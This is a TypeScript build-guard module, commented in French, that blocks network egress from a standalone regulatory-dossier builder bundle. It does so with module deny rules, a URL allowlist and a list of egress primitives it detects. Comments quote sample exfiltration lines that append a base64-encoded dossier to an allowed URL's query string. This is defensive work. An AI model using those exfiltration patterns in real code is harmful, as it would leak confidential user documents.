/**
 * Garde-fou d'ISOLATION du CTD Builder autonome.
 *
 * L'argument de vente du produit est une phrase : « vos documents ne transitent jamais par les
 * serveurs de Pharnos » (PLAN-CTD-BUILDER §1). Une phrase que rien ne vérifie est une promesse
 * commerciale ; ici c'est une promesse RÉGLEMENTAIRE faite à des laboratoires — elle doit être
 * tenue par la mécanique, pas par la discipline.
 *
 * Deux verrous indépendants, et il en faut deux :
 *  1. la CSP `connect-src 'self'` servie sur `builder.pharnos.com` (`web/public-builder/_headers`,
 *     vérifiée par `npm run headers:builder`) — le NAVIGATEUR refuse toute sortie tierce, même si
 *     du code fautif était livré ;
 *  2. ce contrôle-ci — le BUILD refuse de produire un artefact qui contient le code de sortie.
 *
 * Le 1 protège l'utilisateur, le 2 protège la promesse : un bundle qui embarque le client Supabase
 * est un bundle dont on ne peut plus affirmer, en diligence d'acheteur, qu'il ne parle à personne.
 *
 * Fonction PURE (aucune API DOM ni Node) : appelée par `vite.builder.config.ts` sur les modules
 * RÉELLEMENT ÉMIS, et testée unitairement.
 */

export type ForbiddenRule = {
  /** Étiquette lisible, affichée telle quelle dans l'erreur de build. */
  readonly label: string
  /** Reconnaît un identifiant de module normalisé (séparateurs `/`, sans suffixe de requête). */
  readonly matches: (id: string) => boolean
  /** Pourquoi ce module n'a rien à faire dans l'édition autonome. */
  readonly why: string
}

export type ForbiddenHit = {
  readonly moduleId: string
  readonly rule: ForbiddenRule
}

const contains =
  (needle: string) =>
  (id: string): boolean =>
    id.includes(needle)

/**
 * Ce que l'édition autonome ne doit JAMAIS embarquer.
 *
 * La liste vise des CAPACITÉS de sortie réseau ou des périmètres vendus avec l'abonnement
 * (PLAN-CTD-BUILDER §2), pas des fichiers pris un par un : un nouveau `*-sync.ts` est couvert
 * le jour où il est écrit, sans que personne ait à penser à modifier cette liste.
 */
export const FORBIDDEN_RULES: readonly ForbiddenRule[] = [
  {
    label: '@supabase/*',
    // TOUTE la famille, pas le seul méta-paquet : `postgrest-js`, `storage-js`, `functions-js`,
    // `auth-js` et `realtime-js` sont des clients réseau AUTONOMES, importables directement.
    // Vérifié : viser `@supabase/supabase-js` seul laissait entrer REST + Storage + Edge
    // Functions au complet avec un build vert.
    matches: contains('/@supabase/'),
    why: "client réseau du backend — l'édition autonome n'a pas de backend",
  },
  {
    label: 'src/lib/supabase.ts',
    matches: contains('/src/lib/supabase.ts'),
    why: 'singleton du client Supabase (auth + REST + Storage)',
  },
  {
    label: 'src/lib/session.ts',
    matches: contains('/src/lib/session.ts'),
    why: 'session serveur et org courante — notions absentes du produit autonome',
  },
  {
    label: '*-sync.ts(x)',
    // Le module de synchronisation d'une feature, quelle qu'elle soit. C'est LA frontière du
    // produit (§5.1) : « le même dépôt local, sans le module de synchronisation ».
    matches: (id) => /-sync\.tsx?$/.test(id),
    why: 'module de synchronisation — la frontière même du produit autonome',
  },
  {
    label: 'src/lib/flush-outbox.ts',
    // ⚠️ LE SENDER, et lui seul. `src/lib/outbox.ts` n'est PAS interdit : vérifié, il n'importe
    // que Dexie et ne contient aucun appel réseau — c'est une file d'attente purement LOCALE.
    // L'interdire bloquait `dossier-repository`, `catalogue/repository` et
    // `dossier-attachments-repository`, c'est-à-dire tout le socle qu'on veut justement
    // réutiliser (§5.1). Même erreur que d'interdire `roadmap-data.ts` pour son nom : ce qui
    // compte est ce qu'un module FAIT, pas ce qu'il évoque.
    // Conséquence assumée : dans le builder, la file se remplit et personne ne la vide. Elle est
    // locale et bornée par le stockage ; sa purge est un sujet du lot B2 (export/compilation).
    matches: contains('/src/lib/flush-outbox.ts'),
    why: "vidange de la file d'attente VERS LE SERVEUR — le seul module de l'outbox qui émet",
  },
  {
    label: '@sentry/*',
    matches: contains('/@sentry/'),
    why: "télémétrie sortante — révélerait qu'un dossier d'AMM est en cours de montage",
  },
  {
    label: 'src/lib/sentry.ts',
    matches: contains('/src/lib/sentry.ts'),
    why: 'initialisation de la télémétrie sortante',
  },
  {
    label: 'src/features/auth/',
    matches: contains('/src/features/auth/'),
    why: 'authentification — le produit se vend « sans compte à créer » (§7.2)',
  },
  {
    label: 'src/features/admin/',
    matches: contains('/src/features/admin/'),
    why: "console d'administration Pharnos — hors périmètre",
  },
  // ── Frontière d'OFFRE, pas de sécurité ──────────────────────────────────────────────────────
  // Le CTD Builder monte des dossiers conformes au CTD UEMOA. Le suivi de bout en bout — cycle de
  // vie, relances, correspondance — est ce qui distingue l'abonnement `app.pharnos.com` (§2). Ces
  // règles empêchent la frontière commerciale de s'effacer par un import distrait : c'est la même
  // mécanique que pour le réseau, appliquée au périmètre vendu.
  {
    label: 'RoadmapPage (cycle de vie)',
    // ⚠️ La PAGE, pas `roadmap-data.ts` : ce dernier porte les agences et les langues officielles
    // (`agencyFor`, `officialLanguage`), dont le montage d'un dossier a légitimement besoin.
    // Interdire le fichier de données casserait la réutilisation qu'on cherche justement à faire.
    matches: contains('/src/features/workspace/RoadmapPage'),
    why: 'suivi du cycle de vie — vendu avec la plateforme, pas avec le builder',
  },
  {
    label: 'src/features/reminders/',
    matches: contains('/src/features/reminders/'),
    why: 'relances — vendues avec la plateforme, pas avec le builder',
  },
  {
    label: 'src/features/correspondence/',
    matches: contains('/src/features/correspondence/'),
    why: 'correspondance avec les agences — vendue avec la plateforme',
  },
]

/**
 * Normalise un identifiant de module Rollup pour la comparaison :
 *  • séparateurs Windows `\` → `/` (le build tourne sous Windows en local, Linux en CI) ;
 *  • suffixe de requête (`?used`, `?v=…`, `?worker`) retiré — il ne change pas l'origine ;
 *  • préfixe des modules virtuels (`\0`) retiré.
 */
export function normalizeModuleId(id: string): string {
  return id.replace(/^\0/, '').replace(/\\/g, '/').split('?')[0] ?? ''
}

/** Modules interdits présents dans la liste fournie. Vide = artefact conforme. */
export function findForbiddenModules(moduleIds: Iterable<string>): ForbiddenHit[] {
  const hits: ForbiddenHit[] = []
  for (const raw of moduleIds) {
    const id = normalizeModuleId(raw)
    if (!id) continue
    for (const rule of FORBIDDEN_RULES) {
      if (rule.matches(id)) hits.push({ moduleId: id, rule })
    }
  }
  return hits
}

/* ─────────────────────────────────────────────────────────────────────────────────────────────
   SECOND ÉTAGE — le contrôle de CAPACITÉ.
   `findForbiddenModules` est une liste noire de DÉPENDANCES : elle attrape un import du client
   Supabase, pas un `fetch('https://…', { body: dossier })` écrit à la main dans un composant.
   Elle est aussi aveugle aux builds IMBRIQUÉS de Vite (les web workers sont compilés à part et
   émis en ASSET, jamais présents dans `chunk.modules`) — vérifié en revue : neuf caractères
   (`?worker`) suffisaient à faire passer `@supabase/supabase-js` entier.
   Ce second étage lit donc le CODE ÉMIS, chunks et assets JS confondus.
   ───────────────────────────────────────────────────────────────────────────────────────────── */

export type EmittedFile = { readonly file: string; readonly code: string }

export type EgressHit = {
  readonly file: string
  /** L'extrait fautif, tel qu'il apparaît dans l'artefact. */
  readonly evidence: string
  readonly why: string
}

/**
 * URLs absolues tolérées dans le code émis. Aucune n'est jointe au réseau : ce sont des espaces
 * de noms XML et des liens de documentation intégrés par React à ses messages d'erreur.
 * Toute URL hors de cette liste fait échouer le build — c'est le but : une nouvelle adresse dans
 * un produit « sans backend » doit être un acte conscient, pas un effet de bord.
 */
// Liste tenue au plus juste : n'y ajouter une ligne qu'après avoir CONSTATÉ que l'adresse est
// réellement émise, et vérifié dans la source de la dépendance qu'aucun code ne la déréférence.
//
// ⚠️ Deux formes cohabitent, et la différence est la règle : un domaine de confiance s'autorise
// par PRÉFIXE ; un raccourcisseur d'URL s'autorise par correspondance EXACTE et jamais autrement.
// `tinyurl.com/*` ouvrirait la porte à n'importe quelle destination, présente ou future, décidée
// par un tiers — c'est le contraire d'une liste blanche. Le test le vérifie.
const URL_ALLOWLIST: readonly RegExp[] = [
  // ⚠️ Ancrées par `$` sur un jeu de caractères qui EXCLUT `?` et `#` : une entrée de préfixe
  // autorise un chemin, jamais une query. Sans cela, `https://react.dev/errors/?fuite=<dossier>`
  // serait conforme — le préfixe est bon, et le reste emporte le dossier. Vérifié dans l'artefact
  // réel : aucune URL légitime n'y porte de query (React n'émet que le préfixe `…/errors/` et le
  // complète à l'exécution ; les entrées w3.org sont des espaces de noms XML).
  /^https?:\/\/react\.dev\/[\w./-]*$/,
  /^https?:\/\/(www\.)?w3\.org\/[\w./-]*$/,
  // Dexie, messages d'exception. Vérifiés dans `node_modules/dexie/dist/dexie.js` :
  //   • l. 381  `MissingAPI: 'IndexedDB API missing. Please visit https://tinyurl.com/y2uuvskb'`
  //   • l. 4749 `PrematureCommit('Transaction committed too early. See http://bit.ly/2kdckMn')`
  // Ce sont des LITTÉRAUX de chaîne dans des messages d'erreur : aucun `fetch`, aucun `open`,
  // aucune navigation ne les prend en argument. Redirections résolues le 2026-08-04 (301) vers
  // `dexie.org/docs/DexieErrors/Dexie.MissingAPIError` et `…/Dexie.PrematureCommitError.html`,
  // c'est-à-dire la documentation de Dexie elle-même.
  // Elles entrent maintenant parce que le socle de données (Dexie) entre avec le lot B1.
  /^https:\/\/tinyurl\.com\/y2uuvskb$/,
  /^http:\/\/bit\.ly\/2kdckMn$/,
]

/**
 * Primitives de sortie réseau. Ce sont des propriétés d'objets globaux : la minification ne les
 * renomme pas, elle ne peut pas — c'est ce qui rend ce contrôle fiable sur du code compilé.
 * `fetch` n'y figure PAS : trop de faux positifs (le mot apparaît dans des identifiants et des
 * commentaires de dépendances), et toute cible utile de `fetch` est déjà couverte par l'URL.
 */
const EGRESS_PRIMITIVES: readonly { readonly needle: string; readonly why: string }[] = [
  { needle: 'sendBeacon', why: 'envoi en arrière-plan, survit à la fermeture de l’onglet' },
  { needle: 'new WebSocket', why: 'canal bidirectionnel persistant' },
  { needle: 'new EventSource', why: 'flux serveur' },
  { needle: 'XMLHttpRequest', why: 'requête sortante' },
  { needle: 'importScripts', why: 'chargement de code distant dans un worker' },
  // La NAVIGATION de premier niveau est la seule sortie que la CSP ne couvre pas (`navigate-to` a
  // été retirée de la spécification). Ces trois formes n'apparaissent pas une seule fois dans
  // l'artefact actuel : les interdire ne coûte rien et ferme la porte par laquelle on emporterait
  // un dossier dans une query string.
  { needle: 'location.assign', why: 'navigation scriptée — la CSP ne la voit pas' },
  { needle: 'location.replace', why: 'navigation scriptée — la CSP ne la voit pas' },
  { needle: 'window.open', why: 'ouverture d’une origine tierce' },
]

/**
 * ⚠️ Ce que ce contrôle ne peut PAS voir, et qu'il faut savoir avant de le présenter comme une
 * preuve : `location.href = <variable>`. La forme est indétectable par sous-chaîne — l'artefact
 * contient déjà deux `location.href` parfaitement légitimes (React lit celui d'une iframe pour
 * détecter le cross-origin, et teste `localhost`). L'interdire ferait échouer le build sur du code
 * de React, pas sur une fuite.
 *
 * Ce qui reste couvert, et c'est l'essentiel : toute DESTINATION écrite en clair dans le code est
 * vue par la règle d'URL ci-dessus, query et fragment compris. Une exfiltration a besoin d'une
 * adresse ; si elle est littérale, le build la refuse. Si elle est entièrement calculée à
 * l'exécution, aucune analyse statique ne la verra — et c'est la raison pour laquelle la CSP
 * `connect-src 'self'` existe en second verrou, indépendant de celui-ci.
 */

/**
 * Cherche, dans le code RÉELLEMENT ÉMIS, toute adresse absolue non autorisée et toute primitive
 * de sortie réseau. Fonction pure — les fichiers sont fournis par le plugin de build.
 */
export function findEgress(files: Iterable<EmittedFile>): EgressHit[] {
  const hits: EgressHit[] = []
  for (const { file, code } of files) {
    // ⚠️ La query et le fragment font PARTIE de l'URL extraite, et c'est vital : les entrées de
    // `URL_ALLOWLIST` qui se veulent exactes sont ancrées par `$`. Si l'extracteur s'arrêtait au
    // `?`, l'ancre porterait sur une URL TRONQUÉE — et
    // `location.href = 'https://tinyurl.com/y2uuvskb?d=' + btoa(dossier)` serait déclaré conforme
    // alors qu'il exfiltre le dossier. Vérifié : c'était le cas avant ce correctif.
    // Bornes : espaces et guillemets, c'est-à-dire ce qui termine un littéral dans du code émis.
    for (const match of code.matchAll(
      /https?:\/\/[\w.-]+(?:\/[\w./-]*)?(?:\?[^\s'"`)\]]*)?(?:#[^\s'"`)\]]*)?/g,
    )) {
      const url = match[0]
      if (URL_ALLOWLIST.some((re) => re.test(url))) continue
      hits.push({ file, evidence: url, why: 'adresse absolue dans un produit sans backend' })
    }
    for (const { needle, why } of EGRESS_PRIMITIVES) {
      if (code.includes(needle)) hits.push({ file, evidence: needle, why })
    }
  }
  return hits
}

/** Message d'erreur du contrôle de capacité. */
export function formatEgressFailure(hits: readonly EgressHit[]): string {
  // Un même littéral peut apparaître cent fois : on ne montre qu'une occurrence par couple.
  const seen = new Set<string>()
  const lines: string[] = []
  for (const h of hits) {
    const key = `${h.file} ${h.evidence}`
    if (seen.has(key)) continue
    seen.add(key)
    lines.push(`  • ${h.file} : « ${h.evidence} »\n      → ${h.why}`)
  }
  return [
    `Sortie réseau détectée dans l'artefact du CTD Builder — ${lines.length} cas :`,
    ...lines,
    '',
    "Le produit se vend sur l'absence de sortie réseau (PLAN-CTD-BUILDER §1). Si cette adresse",
    'est légitime et jointe par personne (espace de noms, lien de documentation), ajoute-la à',
    "URL_ALLOWLIST dans src/builder/isolation.ts, avec la raison. Si elle est appelée, c'est un",
    'changement de nature du produit : il passe par la CSP de web/public-builder/_headers.',
  ].join('\n')
}

/** Message d'erreur de build : ce qui est entré, par quel nom, et pourquoi c'est refusé. */
export function formatIsolationFailure(hits: readonly ForbiddenHit[]): string {
  const lines = hits.map((h) => `  • ${h.moduleId}\n      → ${h.rule.label} : ${h.rule.why}`)
  return [
    `Isolation du CTD Builder rompue — ${hits.length} module(s) interdits dans l'artefact :`,
    ...lines,
    '',
    "L'édition autonome ne doit contenir aucune capacité de sortie réseau (PLAN-CTD-BUILDER §1).",
    "Retirer l'import fautif, ou — si la sortie est VOULUE (réservation de crédits, lot B3) —",
    'ajouter la règle correspondante en connaissance de cause dans src/builder/isolation.ts',
    'ET ouvrir la CSP de web/public-builder/_headers dans le même commit.',
  ].join('\n')
}
